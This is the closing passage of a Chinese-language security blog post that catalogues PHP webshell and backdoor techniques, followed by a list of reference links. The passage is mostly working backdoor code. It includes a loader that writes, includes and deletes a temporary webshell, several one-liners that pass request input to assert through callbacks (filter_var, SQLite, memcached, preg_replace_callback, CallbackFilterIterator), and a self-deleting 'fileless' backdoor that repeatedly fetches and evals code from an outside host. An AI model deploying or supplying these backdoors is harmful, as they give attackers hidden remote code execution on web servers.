@file_put_contents($f,$cfg_ml);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!file_exists($f))</span><br><span class="line">    &#123;</span><br><span class="line">        $f=$_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/a/&#x27;.$t;</span><br><span class="line">        @file_put_contents($f,$cfg_ml);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!file_exists($f))</span><br><span class="line">    &#123;</span><br><span class="line">        //向脚本所在当前目录下写入临时WEBSHELL文件</span><br><span class="line">        $f=$_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$t;</span><br><span class="line">        @file_put_contents($f,$cfg_ml);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!file_exists($f))</span><br><span class="line">    &#123;</span><br><span class="line">        $f=&#x27;/tmp/&#x27;.$t;</span><br><span class="line">        @file_put_contents($f,$cfg_ml);</span><br><span class="line">    &#125; </span><br><span class="line">    //通过include引入之前写入的临时WEBSHELL文件</span><br><span class="line">    @include($f);</span><br><span class="line">    @unlink($f);  </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="30-利用filter-var-callback特性"><a href="#30-利用filter-var-callback特性" class="headerlink" title="30. 利用filter_var callback特性"></a>30. 利用filter_var callback特性</h3><p>利用filter_var，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    filter_var($_REQUEST[&#x27;op&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="31-数据库回调后门"><a href="#31-数据库回调后门" class="headerlink" title="31. 数据库回调后门"></a>31. 数据库回调后门</h3><p>注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">  $db = new PDO(&#x27;sqlite:sqlite.db3&#x27;);</span><br><span class="line">  $db-&gt;sqliteCreateFunction(&#x27;myfunc&#x27;, $e, 1);</span><br><span class="line">  $sth = $db-&gt;prepare(&quot;SELECT myfunc(:exec)&quot;);</span><br><span class="line">  $sth-&gt;execute(array(&#x27;:exec&#x27; =&gt; $_REQUEST[&#x27;pass&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="32-利用php-memcached执行webshell"><a href="#32-利用php-memcached执行webshell" class="headerlink" title="32. 利用php_memcached执行webshell"></a>32. 利用php_memcached执行webshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $mem = new Memcache();</span><br><span class="line">  $re = $mem-&gt;addServer(&#x27;localhost&#x27;, 11211, TRUE, 100, 0, -1, TRUE, create_function(&#x27;$a,$b,$c,$d,$e&#x27;, &#x27;return assert($a);&#x27;));</span><br><span class="line">  $mem-&gt;connect($_REQUEST[&#x27;op&#x27;], 11211, 0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="33-利用preg-replace-callback隐藏webshell"><a href="#33-利用preg-replace-callback隐藏webshell" class="headerlink" title="33. 利用preg_replace_callback隐藏webshell"></a>33. 利用preg_replace_callback隐藏webshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  preg_replace_callback(&#x27;/.+/i&#x27;, create_function(&#x27;$arr&#x27;, &#x27;return assert($arr[0]);&#x27;),$_REQUEST[&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  mb_ereg_replace_callback(&#x27;.+&#x27;, create_function(&#x27;$arr&#x27;, &#x27;return assert($arr[0]);&#x27;),$_REQUEST[&#x27;op&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="34-利用CallbackFilterIterator部署回调后门"><a href="#34-利用CallbackFilterIterator部署回调后门" class="headerlink" title="34. 利用CallbackFilterIterator部署回调后门"></a>34. 利用CallbackFilterIterator部署回调后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST[&#x27;op&#x27;],)), create_function(&#x27;$a&#x27;, &#x27;assert($a);&#x27;));</span><br><span class="line">  foreach ($iterator as $item) </span><br><span class="line">  &#123;</span><br><span class="line">    echo $item;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="35-PHP无文件后门"><a href="#35-PHP无文件后门" class="headerlink" title="35. PHP无文件后门"></a>35. PHP无文件后门</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">unlink($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]);</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line"></span><br><span class="line">$remote_file = &#x27;http://xsser.me/eval.txt&#x27;;</span><br><span class="line">while($code = file_get_contents($remote_file))&#123;</span><br><span class="line">  @eval($code);</span><br><span class="line">  sleep(5);</span><br><span class="line">&#125;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Webshell-Part1&amp;Part2.html">https://wooyun.js.org/drops/Webshell-Part1&amp;Part2.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://lcx.cc/post/3188/">https://lcx.cc/post/3188/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/3522990.html">https://www.cnblogs.com/LittleHann/p/3522990.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html">https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/web-shells-penetration-testing/">https://www.hackingarticles.in/web-shells-penetration-testing/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/">https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2335">https://xz.aliyun.com/t/2335</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PO6khkGHWKd9_EzZocXGaA">https://mp.weixin.qq.com/s/PO6khkGHWKd9_EzZocXGaA</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.exif-read-data.php">https://www.php.net/manual/zh/function.exif-read-data.php</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Webshell/" rel="tag" <i class="fa fa-tag"></i> Webshell</a>
              <a href="/tags/Malware/" rel="tag" <i class="fa fa-tag"></i> Malware</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/50666/" rel="prev" title="Linux入侵痕迹清除姿势">
                  <i class="fa fa-chevron-left"></i> Linux入侵痕迹清除姿势
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/20801/" rel="next" title="Docker攻击面探究">
                  Docker攻击面探究 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">L0n9w4y</span>
</div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>

  





</body>
</html>
